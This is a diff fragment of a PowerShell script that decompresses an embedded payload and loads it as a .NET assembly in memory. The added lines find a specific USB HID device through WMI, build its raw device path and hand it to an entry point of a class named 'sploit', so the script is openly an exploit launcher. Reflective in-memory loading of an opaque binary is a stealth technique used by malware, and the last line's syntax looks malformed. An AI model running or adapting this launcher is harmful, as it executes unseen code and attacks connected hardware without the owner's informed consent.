@@ -38,3 +38,12 @@ $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Conv
 $UncompressedFileBytes = New-Object Byte[](4608)
 $DeflatedStream.Read($UncompressedFileBytes, 0, 4608) | Out-Null
 [Reflection.Assembly]::Load($UncompressedFileBytes)
+
+$devs = gwmi Win32_USBControllerDevice
+foreach ($dev in $devs) {
+        $wmidev = [wmi]$dev.Dependent
+        if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
+                $fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+        }
+}
+[ps]::[sploit]::i($fn)
